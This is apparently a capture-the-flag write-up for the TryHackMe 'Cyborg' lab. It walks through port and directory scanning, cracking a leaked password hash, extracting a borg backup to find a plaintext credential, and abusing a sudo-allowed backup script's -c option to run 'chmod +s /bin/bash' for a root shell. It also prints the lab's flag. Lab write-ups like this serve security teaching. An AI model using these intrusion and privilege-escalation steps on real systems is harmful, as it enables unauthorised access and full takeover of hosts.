> Cyborg

**export IP=10.10.66.158**

# Nmap

nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp    open     ssh        syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http       syn-ack     Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

# Nikto

nikto -h http://$IP

```
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
```

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -x txt,php,bak,tar,cgi,sql,bin

```
/admin (Status: 301)
/etc (Status: 301)
```

In /etc folder we got 2 files `passwd` and `squid.conf`. `passwd` file has hash of music_archive and squid.conf is a config file. After cracking using hashcat we can find the password as `squidward`.

## squid.conf

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

While checking out /admin directory we got an archive and extracting it we can see `home/field/dev/final_archive` and can find a `README.md` file. And find that it is a borg directory. We can download a borg64 binary and can extract the archive.

borg extract final_archive/::music_archive => We got the archive using password `squidward`

Looking at `~/TryHackMe/Cyborg/home/field/dev/home/alex/Documents` we get note.txt

## note.txt

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

# Privilege Escalation

sudo -l

```
User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

## backup.sh

```
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
	case "${flag}" in 
		c) command=${OPTARG};;
	esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

We can find that we can use option c to extecute commands.

sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"

`bash -p` we are in now as root!!

# root.txt

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```